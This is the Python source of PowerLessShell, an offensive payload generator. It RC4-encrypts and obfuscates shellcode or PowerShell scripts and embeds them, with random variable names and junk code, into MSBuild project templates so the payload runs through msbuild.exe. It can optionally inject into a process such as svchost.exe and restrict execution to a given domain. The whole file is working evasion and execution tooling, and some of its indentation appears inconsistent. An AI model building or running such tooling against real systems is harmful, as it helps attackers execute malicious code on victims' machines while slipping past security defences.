# Author: Mr.Un1k0d3r - RingZer0 Team 2017
# Code clean up 2021 <3

import argparse
import random
import string
import base64
import sys
import re
import os

TEMPLATE = "include/template-"

class Generator:

	def __init__(self):
		self.error = 0
		self.banner()		

	def print_error(self, error):
		print "\033[91m[-] >>> %s\033[00m" % error
		
	def banner(self):
		print "PowerLessShell Less is More\r\nMr.Un1k0d3r RingZer0 Team\r\n-----------------------------------------------------------"
			
	def set_template(self, path):
		self.data = self.load_file(path, True)
		self.rand_vars()
		
	def gen_str(self, size):
		return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
		
	def rand_vars(self):
		for i in reversed(range(1, 100)):
			self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
			
	def get_output(self):
		return self.data
		
	def gen_rc4_key(self, size):
		return os.urandom(size)
		
	def format_rc4_key(self, key):
		return "0x" + ", 0x".join(re.findall("..", key.encode("hex")))
		
	def load_file(self, path, fatal_error = False):
		data = ""
		try:
			data = open(path, "rb").read()
		except:
			self.error = 1
			self.print_error("%s file not found." % path)
			if fatal_error:
				exit(0)
		return data
		
	def set_condition(self, data, value = ""):
		if value == "":
			return data.replace("[CONDITION]", "")
		else:
			return data.replace("[CONDITION]", ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)
   	@staticmethod
    	def gen_pattern(charset):	
		return ''.join(random.sample(charset,len(charset)))
	
	def gen_junk(self):
		junk = ["int", "var", "float", "decimal", "uint", "double", "long"]
		data = ""
		for i in range(0, random.randrange(1, 12)):
			data += "\t\t\t\t%s %s = %d;\r\n" % (random.choice(junk), self.gen_str(random.randrange(5, 25)), random.randrange(1, 100000))
			
		return data
	
class RC4:

	def KSA(self, key):
		keylength = len(key)
		S = range(256)
		j = 0
		for i in range(256):
			j = (j + S[i] + key[i % keylength]) % 256
			S[i], S[j] = S[j], S[i]
		return S
	
	def PRGA(self, S):
		i = 0
		j = 0
		while True:
			i = (i + 1) % 256
			j = (j + S[i]) % 256
			S[i], S[j] = S[j], S[i] 

			K = S[(S[i] + S[j]) % 256]
			yield K

	def Encrypt(self, plaintext, key):
		output = ""
		key = [ord(c) for c in key]
		S = self.KSA(key)
		keystream = self.PRGA(S)
		for c in plaintext:
			output = output + chr(ord(c) ^ keystream.next())
		return output	
		
if __name__ == "__main__":
	gen = Generator()
	parser = argparse.ArgumentParser()
	
	parser.add_argument('-type', action='store', default="shellcode", help='Payload type (shellcode/shellcode_inject/powershell) default to: shellcode')
	parser.add_argument('-source', action='store', help='Path to the source file (raw shellcode or powershell script)', required=True)
	parser.add_argument('-output', action='store', help='MSBuild output filename', required=True)
	parser.add_argument('-arch', action='store', default='32', help='Shellcode architecture (32/64) default to: 32')
        parser.add_argument('-processpath', action='store', default='c:\\\windows\\\system32\\\svchost.exe', help='Process filename path for shellcode inject default is: c:\\\windows\\\system32\\\svchost.exe (note for double \\\. use process matching the shellcode architecture!)')
	parser.add_argument('-condition', action='store', default="", help='XML Compiling condition default (Check for USERDOMAIN) default is: none')
	options = parser.parse_args()
	
	template_path = TEMPLATE
	shellcode_arch = ""
	data = ""
        shellcode_inject_path = options.processpath
	
	if options.type == "powershell":
		template_path += "powershell.csproj"
	elif options.type == "shellcode":
		template_path += "shellcode.csproj"
        else:
                template_path += "shellcode_inject.csproj"
		
	print "Generating the msbuild file using %s as the template" % template_path
	
	if options.arch == "64":
		shellcode_arch = "64"
		print "Generating a payload for a 64 bits shellcode! Don't forget to use the 64 bits version of msbuild.exe"

        if options.arch != "64" and options.type == "shellcode_inject":
                print "Shellcode Injection Template is in use with 32 bits architecure! Don't forget to use 32 bits process to inject"
                
	gen.set_template(template_path)
	rc4 = RC4()
	key = gen.gen_rc4_key(32)

	data = gen.load_file(options.source, True)	
	cipher = base64.b64encode(rc4.Encrypt(data, key))
		
	pattern1 = Generator.gen_pattern("#!@$%?&-~")
	pattern2 = Generator.gen_pattern(",.<>)(*[]{}`")	
	cipher = cipher.replace("m", pattern1).replace("V", pattern2)
	
	output = gen.get_output()
	output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
	output = output.replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
	output = output.replace("[JUNK1]", gen.gen_junk()).replace("[JUNK2]", gen.gen_junk()).replace("[JUNK3]", gen.gen_junk())
	condition = options.condition
	output = gen.set_condition(output, condition)
	output = output.replace("[ARCH]", shellcode_arch)
        output = output.replace("[PROCESSPATH]", shellcode_inject_path);
	
	try:
		open(options.output, "wb").write(output)
	except:
		gen.print_error("Failed to write the output to '%s'" % options.output)
		exit(0)
		
	print "File '%s' created" % options.output
	print "Process completed"
